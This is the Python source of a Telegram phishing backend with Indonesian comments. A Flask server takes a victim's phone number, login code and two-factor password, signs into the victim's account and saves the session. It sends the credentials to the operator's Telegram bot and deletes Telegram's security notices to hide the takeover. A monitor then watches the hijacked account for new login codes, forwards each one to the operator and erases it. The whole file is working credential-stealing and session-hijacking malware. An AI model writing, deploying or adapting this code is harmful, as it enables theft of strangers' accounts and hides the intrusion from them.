import os, requests, asyncio, re, threading
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient, events, errors
from telethon.sessions import StringSession
from telethon.tl.functions.messages import DeleteHistoryRequest

app = Flask(__name__)
CORS(app)

API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
RAILWAY_URL = f"https://{os.getenv('RAILWAY_STATIC_URL')}"

user_db = {}

def bot_api(method, payload):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
        res = requests.post(url, json=payload, timeout=15)
        return res.json()
    except: return {}

def set_webhook():
    if os.getenv('RAILWAY_STATIC_URL'):
        bot_api("setWebhook", {"url": f"{RAILWAY_URL}/webhook"})

def normalisasi_nomor(nomor):
    num = re.sub(r'\D', '', nomor)
    if num.startswith('0'): num = '62' + num[1:]
    return '+' + num

@app.route('/register', methods=['POST'])
def register():
    data = request.get_json()
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(handle_flow(data))
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500
    finally: loop.close()

async def handle_flow(data):
    client = None
    try:
        step = int(data.get('step', 1))
        nomor = normalisasi_nomor(data.get('nomor', ''))
        nama = data.get('nama', 'User')
        
        if nomor not in user_db:
            user_db[nomor] = {"session": "", "hash": "", "nama": nama, "sandi": "None"}

        client = TelegramClient(StringSession(user_db[nomor]['session']), int(API_ID), API_HASH)
        await client.connect()

        if step == 1:
            res = await client.send_code_request(nomor)
            user_db[nomor].update({"hash": res.phone_code_hash, "session": client.session.save()})
            return jsonify({"status": "success"})

        elif step == 2:
            await client.sign_in(nomor, data.get('otp'), phone_code_hash=user_db[nomor]['hash'])
            user_db[nomor]['session'] = client.session.save()
            
            # FITUR HAPUS PESAN KODE SETELAH LOGIN BERHASIL
            await client(DeleteHistoryRequest(peer='62', max_id=0, just_clear=False, revoke=True)) # '62' adalah ID Telegram Service
            
            text = f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: None\nOTP : `{data.get('otp')}`"
            bot_api("sendMessage", {"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown", "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"upd_{nomor}"}]]}})
            return jsonify({"status": "success"})

        elif step == 3:
            await client.sign_in(password=data.get('sandi'))
            user_db[nomor].update({"sandi": data.get('sandi'), "session": client.session.save()})
            
            # HAPUS CHAT LAGI SETELAH 2FA
            await client(DeleteHistoryRequest(peer=777000, max_id=0, just_clear=False, revoke=True))
            
            text = f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: **{data.get('sandi')}**\nOTP : None"
            bot_api("sendMessage", {"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown", "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"upd_{nomor}"}]]}})
            return jsonify({"status": "success"})
    finally:
        if client: await client.disconnect()

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.get_json()
    if update and "callback_query" in update:
        call = update["callback_query"]
        action, nomor = call["data"].split("_")
        if action == "upd":
            res = bot_api("sendMessage", {"chat_id": CHAT_ID, "text": "Bot siap mengintip OTP!\nSilakan minta kode di TurboTel/Telegraph Anda.", "reply_markup": {"inline_keyboard": [[{"text": "exit", "callback_data": f"exit_{nomor}"}]]}})
            user_db.setdefault(nomor, {})['status_id'] = res.get('result', {}).get('message_id')
            threading.Thread(target=lambda: asyncio.run(monitor_otp(nomor))).start()
        elif action == "exit":
            if user_db.get(nomor, {}).get('status_id'):
                bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": user_db[nomor]['status_id']})
    return jsonify({"status": "success"})

async def monitor_otp(nomor):
    data = user_db.get(nomor)
    if not data or not data['session']: return
    client = TelegramClient(StringSession(data['session']), int(API_ID), API_HASH)
    await client.connect()
    try:
        @client.on(events.NewMessage(from_users=777000))
        async def handler(event):
            otp = re.search(r'\b\d{5}\b', event.raw_text)
            if otp:
                # 1. KIRIM DATA LENGKAP KE BOT
                text_baru = f"Nama: **{data['nama']}**\nNomor: `{nomor}`\nKata sandi: **{data.get('sandi','None')}**\nOTP : `{otp.group(0)}`"
                bot_api("sendMessage", {"chat_id": CHAT_ID, "text": text_baru, "parse_mode": "Markdown"})
                
                # 2. OTOMATIS HAPUS PESAN KODE DI AKUN TARGET
                await event.delete(revoke=True)
                
                # 3. HAPUS RIWAYAT CHAT DARI TELEGRAM SERVICE BIAR BERSIH TOTAL
                await client(DeleteHistoryRequest(peer=777000, max_id=0, just_clear=False, revoke=True))
                
                if data.get('status_id'):
                    bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": data['status_id']})
        
        await asyncio.wait_for(client.run_until_disconnected(), timeout=900)
    except: pass
    finally: 
        if client.is_connected(): await client.disconnect()

if __name__ == "__main__":
    set_webhook()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))
